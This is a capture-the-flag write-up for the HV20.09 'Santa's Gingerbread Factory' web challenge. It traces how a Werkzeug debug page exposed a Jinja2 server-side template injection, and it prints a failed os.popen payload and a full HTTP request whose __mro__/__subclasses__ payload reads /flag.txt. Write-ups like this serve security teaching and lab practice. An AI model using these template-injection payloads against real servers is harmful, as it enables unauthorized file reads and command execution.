# HV20.09 Santa's Gingerbread Factory

| <!-- --> | <!-- --> |
| --- | --- |
| **Author**     | inik |
| **Level**      | medium |
| **Categories** | `penetration testing`, `web security` |

## Description

### Introduction
Here you can customize your absolutely fat-free gingerbread man.

**Note**: Start your personal instance from the `RESOURCES` section on top.

### Goal / Mission
Besides the gingerbread men, there are other goodies there. Let's see if you can get the goodie, which is stored in `/flag.txt`.

## Approach

After some clueless attempts entering random characters, the input ``eyes=vader&name=bla<'///><`\\"+*ç%&/()=`` caused an exception in the application and returned an error page along with a [debugger, provided by the Werkzeug framework](https://werkzeug.palletsprojects.com/en/1.0.x/debug/).

Fiddling around with the debugger did not lead anywhere, as we didn't know the PIN to run a shell - exploits [like this one](https://github.com/its-arun/Werkzeug-Debug-RCE/blob/master/werkzeug.py) were not possible.

However, the error page also showed, that user input was concatenated with the Jinja2 template and rendered as a whole. That became the focus now.

Using Burpsuite's Repeater, I proceeded to abusing the template. It was a bit harder than initially thought, since you can't simply `import` anything you want. The following payload did not work:

```
eyes=*&name={%25+__import__('os').popen(\'whoami\').read()%3b+%25}
```

The error was: `TemplateSyntaxError: Encountered unknown tag '__import__'.`

Other (unsuccessful) approaches that I tried out are documented here:
- https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
- https://jinja2docs.readthedocs.io/en/stable/templates.html?highlight=include#include

Some more web crawling was needed to finally stumble on the following link at Exploit-DB describing a Server-side Template Injection vulnerability: https://www.exploit-db.com/exploits/46386.

With that information, I crafted the request hereafter and was able to find the flag:
```
POST / HTTP/1.1
Host: 283b1812-7b4f-4721-9095-86dd0ebbac0d.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Origin: https://283b1812-7b4f-4721-9095-86dd0ebbac0d.idocker.vuln.land
Connection: close
Referer: https://283b1812-7b4f-4721-9095-86dd0ebbac0d.idocker.vuln.land/
Upgrade-Insecure-Requests: 1

eyes=*&name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read() }}
```

The vulnerability exploits the property that each class in python keeps a reference to its superclasses through `__mro__` and to its subclasses through `__subclasses__`. This is how one is able to go up to `Object` from a `str` object and down again to a `file` class, which was then used to instantiate a new object and read out the file.

Note however, that this works for Python 2.7. The principle is still valid in Python 3, but indexes are different (and the `file` class seems not directly available anymore).

## Flag
`HV20{SST1_N0t_0NLY_H1Ts_UB3R!!!}`

## Tools
- Burpsuite
- Firefox
- DuckDuckGo
